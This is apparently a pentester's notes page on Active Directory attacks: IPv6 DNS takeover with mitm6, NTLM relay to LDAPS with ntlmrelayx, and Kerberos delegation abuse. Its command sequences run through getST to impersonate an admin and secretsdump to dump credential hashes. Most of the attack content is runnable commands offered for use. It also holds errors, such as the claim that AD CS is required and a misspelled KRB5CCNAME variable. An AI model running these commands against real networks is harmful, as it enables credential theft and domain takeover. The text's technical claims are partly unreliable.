# ⭕ DNS Takeover + LDAP Relay

## <mark style="color:red;">IPv6 DNS Takeover</mark>

ipv6 is setup by default on all windows machines in a network even if the network doesnt utilize v6 so no one is doing dns resolotion for v6 .an attacker can setup a fake dns server and resolve all ipv6 requests in a network and forward them to the DC so we can sniff the authentication and hashs on the way with a tool like MitM6.

{% hint style="info" %}
For DNS takeover to work, the AD CS role must be installed and configured on the domain controller.
{% endhint %}

we run mitm6 on the domain use -i to specify the interface.

```
python mitm6.py -i vboxnet0 -d megacorp.local
```

leave the terminal open, for now we are playing the role of an IPv6 DNS server in the network.

## <mark style="color:red;">LDAP Relay</mark>

we use ntlmrelayx.py script from impacket tools to relay the credentials when a client requests for IPv6 resources.

```
ntlmrelayx.py -6  -t ldaps://[DC address] -wh fakewpad.megacorp.local -l lootme
```

**lootme :** the directory to save the hashes

#### we could use ldap instead of ldaps for LDAP without a certification but most domains use this feature. ipv6 is going to ask for dns every 30 minutes or after restarting the machine.

#### ntlmrelayx.py might not show the success message in the terminal just check the lootme directory.

![](<../../../.gitbook/assets/image (210).png>)

![](<../../../.gitbook/assets/image (207).png>)

#### we can open up the results with firefox

## <mark style="color:red;">NTLM Relay + Kerberos Delegation</mark>

similarly we can use these commands to target WPAD and grab NTLM hashes:

```
# take over DNS with mitm6
sudo mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqdn


# receive connection, create a computer and grant delegation rights
impacket-ntlmrelayx -t ldaps://192.168.56.115 -wh attacker-wpad --delegate-access


# use impacket getST.py to obtain kerberos ticket
getST.py -spn cifs/icorp-w10.internal.corp internal.corp/RDPOF\$ -impersonate admin


# now with this ticket you can do whatever you want
# for example dumping hashes
export KRBCCNAME=admin.ccache
secretsdump.py -k -no-pass icorp-w10.internal.corp
```
